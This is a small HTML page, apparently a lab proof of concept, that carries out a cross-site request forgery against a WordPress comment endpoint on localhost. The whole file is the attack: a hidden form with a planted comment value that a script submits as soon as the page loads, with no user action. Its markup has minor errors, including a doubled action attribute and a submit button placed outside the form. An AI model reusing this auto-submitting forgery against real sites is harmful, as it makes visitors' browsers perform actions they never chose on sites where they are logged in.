<!doctype html>
<html>

<head>

    <title>XSRF</title>


</head>
<h1> XSRF ATTACK</h1>
<body>
<form name="CSRF" action =action="http://localhost:85/frameworks/wordpress/wp-comments-post.php" method="post">
    <input type="hidden" name="comment" Value="XSRF ATTACK ONE">

</form>
<input name="submit" type="submit" id="submit" class="submit" value="Post Comment" />
<script>
    document.CSRF.submit();
</script>
</body>
</html>